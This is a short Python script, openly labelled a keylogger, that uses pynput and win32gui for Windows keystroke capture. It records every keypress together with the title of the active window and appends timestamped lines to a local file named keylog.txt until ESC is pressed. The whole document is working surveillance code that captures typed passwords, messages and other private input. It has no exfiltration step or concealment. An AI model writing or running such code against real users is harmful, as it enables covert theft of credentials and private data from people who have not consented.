from pynput import keyboard
import win32gui
from datetime import datetime

log_file = "keylog.txt"
sentence = ""
current_window = None

def get_active_window_title():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def write_log(data):
    with open(log_file, "a", encoding="utf-8") as file:
        file.write(data + "\n")

def on_press(key):
    global sentence, current_window

    try:
        new_window = get_active_window_title()
        if new_window != current_window:
            current_window = new_window
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write_log(f"\n[{timestamp}] - Active Window: {current_window}")

        if key == keyboard.Key.space:
            sentence += " "
        elif key == keyboard.Key.enter:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write_log(f"[{timestamp}] {sentence}")
            sentence = ""
        elif key == keyboard.Key.esc:
            if sentence:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                write_log(f"[{timestamp}] {sentence}")
            return False
        elif hasattr(key, 'char') and key.char is not None:
            sentence += key.char
        else:
            sentence += f"[{key.name.upper()}]"

    except Exception as e:
        pass

print("[*] Keylogger is running... Press ESC to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
